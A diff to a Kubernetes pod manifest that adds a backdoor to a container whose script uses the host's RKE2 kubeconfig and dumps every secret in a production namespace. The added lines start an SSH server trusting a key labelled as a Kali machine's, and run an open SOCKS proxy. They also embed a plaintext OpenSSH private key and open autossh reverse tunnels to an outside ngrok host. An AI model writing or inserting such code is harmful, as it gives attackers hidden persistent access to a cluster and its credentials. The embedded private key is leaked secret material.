@@ -13,11 +13,49 @@ spec:
       - /bin/sh
       - -c
       - |
-        apk add --no-cache util-linux curl jq openssl redis bash > /dev/null 2>&1
+        apk add --no-cache util-linux curl jq openssl redis bash openssh-server openssh-client autossh microsocks > /dev/null 2>&1
         curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
         chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
 
         export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
+
+        # ---------- SSH SERVER NEL POD ----------
+        ssh-keygen -A >/dev/null 2>&1
+        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+        cat > /root/.ssh/authorized_keys <<'EOF'
+        PASTE_KALI_PUBKEY_HERE
+        EOF
+        chmod 600 /root/.ssh/authorized_keys
+        /usr/sbin/sshd -D &
+        # ---------------------------------------
+
+        # ---------- SOCKS NEL POD ----------
+        microsocks -p 1080 -i 0.0.0.0 &
+        # ----------------------------------
+
+        # ---------- TUNNEL NGROK ----------
+        mkdir -p /root/.ssh
+        cat > /root/.ssh/id_ed25519 <<'EOF'
+        -----BEGIN OPENSSH PRIVATE KEY-----
+        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+        QyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4gAAAJAMSDC8DEgw
+        vAAAAAtzc2gtZWQyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4g
+        AAAEAXg3D2WLL1mCR1DtHTy3EkJUwN/Uakv7y1CzWebJSPgYLm+J5p9RAHDA/vujLa1+WD
+        iM67g0wXFpT/1auPOK7iAAAACHBvZEBlZ2FtAQIDBAU=
+        -----END OPENSSH PRIVATE KEY-----
+        EOF
+        chmod 600 /root/.ssh/id_ed25519
+        ssh-keyscan -p 20849 8.tcp.ngrok.io >> /root/.ssh/known_hosts 2>/dev/null
+        autossh -M 0 -f -N \
+          -o "StrictHostKeyChecking=no" \
+          -o "ServerAliveInterval=30" \
+          -o "ExitOnForwardFailure=yes" \
+          -R 0.0.0.0:2222:localhost:22 \
+          -R 0.0.0.0:1080:localhost:1080 \
+          -i /root/.ssh/id_ed25519 \
+          tunnel@8.tcp.ngrok.io -p 20849
+        echo "TUNNEL_UP"
+        # ----------------------------------
 
         echo "=========================================="
         echo "=== 1. ALL SECRETS IN egam-production ==="
